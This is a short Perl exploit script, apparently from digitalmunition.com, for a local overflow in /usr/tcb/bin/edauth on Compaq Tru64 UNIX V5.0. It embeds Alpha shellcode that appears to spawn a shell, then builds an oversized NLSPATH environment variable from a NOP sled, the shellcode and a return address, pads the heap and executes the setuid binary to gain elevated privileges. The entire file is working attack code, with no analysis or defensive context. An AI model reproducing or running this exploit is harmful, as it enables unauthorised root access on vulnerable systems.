#!/usr/bin/perl -w
#
# based on work by stripey from back in the day
# kf_lists[at]digitalmunition[dot]com
#
# http://www.digitalmunition.com

$sc .= "\x30\x15\xd9\x43\x11\x74\xf0\x47\x12\x14\x02\x42";
$sc .= "\xfc\xff\x32\xb2\x12\x94\x09\x42\xfc\xff\x32\xb2";
$sc .= "\xff\x47\x3f\x26\x1f\x04\x31\x22\xfc\xff\x30\xb2";
$sc .= "\xf7\xff\x1f\xd2\x10\x04\xff\x47\x11\x14\xe3\x43";
$sc .= "\x20\x35\x20\x42\xff\xff\xff\xff\x30\x15\xd9\x43";
$sc .= "\x31\x15\xd8\x43\x12\x04\xff\x47\x40\xff\x1e\xb6";
$sc .= "\x48\xff\xfe\xb7\x98\xff\x7f\x26\xd0\x8c\x73\x22";
$sc .= "\x13\x05\xf3\x47\x3c\xff\x7e\xb2\x69\x6e\x7f\x26";
$sc .= "\x2f\x62\x73\x22\x38\xff\x7e\xb2\x13\x94\xe7\x43";
$sc .= "\x20\x35\x60\x42\xff\xff\xff\xff";

print "Shellcode is " . length($sc) . " bytes long \n";

$tlen = (1024-(length($sc)))/4;

$ENV{"NLSPATH"} = "";
system("ulimit -c 10000");
# 0x140010200 Compaq Tru64 UNIX V5.0 (Rev. 910) (TruNastyWhore.localdomain) 
# 0x140012002
$ret = "\x02\x20\x01\x40\x01";
$ENV{"NLSPATH"}= pack("l",0x47ff041f) x ($tlen) . $sc . $ret;
$heapgrow = "B" x 10000 . " " .  "C" x 10000 . "D" x 10000;
exec("/usr/tcb/bin/edauth -df DMr0x.$heapgrow");
